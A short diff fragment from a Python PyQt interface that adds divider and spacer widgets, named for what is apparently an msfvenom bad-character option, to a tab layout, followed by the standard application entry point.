+        self.tab7_container_layout.insertWidget(202, self.msfv_web_badchar_divider2)
+        self.tab7_container_layout.insertWidget(203, self.msfv_web_badchar_spacer2)
+        self.tab7_container_layout.addStretch()
 
 if __name__ == '__main__':
     app = QApplication(sys.argv)
